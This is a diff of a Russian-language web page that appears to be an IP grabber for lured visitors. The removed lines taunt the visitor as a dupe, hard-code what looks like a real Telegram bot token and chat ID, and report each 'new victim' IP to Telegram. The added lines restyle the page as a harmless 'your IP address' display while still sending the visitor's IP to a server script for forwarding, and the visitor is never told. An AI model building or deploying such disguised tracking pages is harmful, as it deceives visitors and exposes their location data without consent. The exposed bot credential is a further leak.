@@ -3,50 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get User IP</title>
+    <title>IP Collector</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            font-size: 18px;
+            color: #666;
+        }
+        .loading {
+            color: #ff5e5e;
+            font-size: 18px;
+        }
+    </style>
 </head>
 <body>
-    <h1>ХААХАХАХАХАХХ ПОВЕЛСЯ ГЛУПИНЬКИЙ</h1>
-    <p id="ip-address">Получение IP-адреса...</p>
+    <div class="container">
+        <h1>Ваш IP-адрес</h1>
+        <p id="ip-address" class="loading">Получение IP-адреса...</p>
+    </div>
 
     <script>
-        // Замените 'YOUR_BOT_TOKEN' на токен вашего Telegram бота
-        const BOT_TOKEN = '7539465649:AAEJLhvN4ltTiOQL99Vtq6k0OLXGGsG3cgw';
-        // Замените 'YOUR_CHAT_ID' на ваш chat_id в Telegram
-        const CHAT_ID = '1206254100';
-
         // Функция для получения IP с помощью ipify API
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 const userIp = data.ip;
-
-                // Отображаем IP на сайте
+                
+                // Отображаем IP на странице
                 document.getElementById("ip-address").textContent = "Ваш IP-адрес: " + userIp;
 
-                // Отправляем IP-адрес в Telegram
-                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-                const message = `Новая жертва: ${userIp}`;
-
-                fetch(telegramApiUrl, {
+                // Отправляем IP на сервер (в PHP-скрипт для отправки в Telegram)
+                fetch('send_ip.php', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message
-                    })
+                    body: JSON.stringify({ ip: userIp })
                 }).then(response => {
                     if (response.ok) {
-                        console.log("Сообщение отправлено в Telegram");
+                        console.log("IP успешно отправлен на сервер");
                     } else {
-                        console.error("Ошибка отправки сообщения");
+                        console.log("Ошибка отправки IP на сервер");
                     }
                 });
             })
             .catch(error => {
+                document.getElementById("ip-address").textContent = "Ошибка получения IP";
                 console.error('Ошибка получения IP:', error);
             });
     </script>
